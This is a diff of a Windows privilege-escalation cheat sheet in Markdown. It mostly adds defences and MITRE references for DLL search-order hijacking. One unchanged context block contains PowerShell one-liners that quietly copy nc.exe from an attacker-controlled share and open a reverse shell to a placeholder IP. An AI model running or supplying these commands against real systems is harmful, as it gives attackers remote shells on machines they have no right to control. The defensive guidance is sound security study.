@@ -1218,10 +1218,9 @@ Check the last leter within the parantheses which is interpretted as the followi
 - **R**: Read-only access
 - **W**: Write-only access
 
-
 :white_check_mark: How to protect against or detect that technique:
 
-- *Active Defense*: Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. 
+- *Active Defense*: Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc.
 
 For more information about that technique refer to [T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
 
@@ -1253,7 +1252,7 @@ Microsoft once mentionned the following
 >“When an application dynamically loads a dynamic-link library without specifying a fully qualified path name, Windows attempts to locate the DLL by searching a well-defined set of directories in a particular order.
 >If an attacker gains control of one of the directories on the DLL search path, it can place a malicious copy of the DLL in that directory. This is sometimes called a DLL preloading attack or a binary planting attack. If the system does not find a legitimate copy of the DLL before it searches the compromised directory, it loads the malicious DLL. If the application is running with administrator privileges, the attacker may succeed in local privilege elevation.”
 
-Here is the order:
+Here is the order (Note that it depends if SafeDllSearchMode is enabled or not):
 
 1) The directory from which the application is loaded
 2) The system directory
@@ -1359,6 +1358,20 @@ powershell -windowstyle hidden copy \\\\\\\OUR_IP\\\temporary\\\\nc.exe & nc.exe
 # Older
 powershell -windowstyle hidden copy \\\\\\\OUR_IP\\\temporary\\\\nc.exe & nc.exe OUR_IP OUR_NC_PORT -e cmd.exe
 ```
+
+:white_check_mark: How to protect against or detect that technique:
+
+- *Architecture*: When developping applications,use fully qualified path when loading DLLs
+- *Architecture*: If available, use the function such as [SetDllDirectoryA](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setdlldirectorya) *with empty string* to removes the current directory from the default DLL search order.
+- *Architecture*: Disallow loading of remote DLLs.
+- *Architecture*: Enable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions *(e.g. %SYSTEMROOT%)* to be used before local directory DLLs
+- *Passive Defense*: Audit for DLL search order hijacking opportunities on systems within an enterprise and correct them.
+- *Active Defense*: Use Endpoint Protection system which odentify and block potentially malicious software executed through search order hijacking.
+- *Active Defense*: Monitor file systems for moving, renaming, replacing, or modifying DLLs outside planned installations/updates.
+- *Active Defense*: Monitor changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software.
+- *Active Defense*: Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths.
+
+For more information about that technique refer to [T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/)
 
 ##### DLL Proxying
 
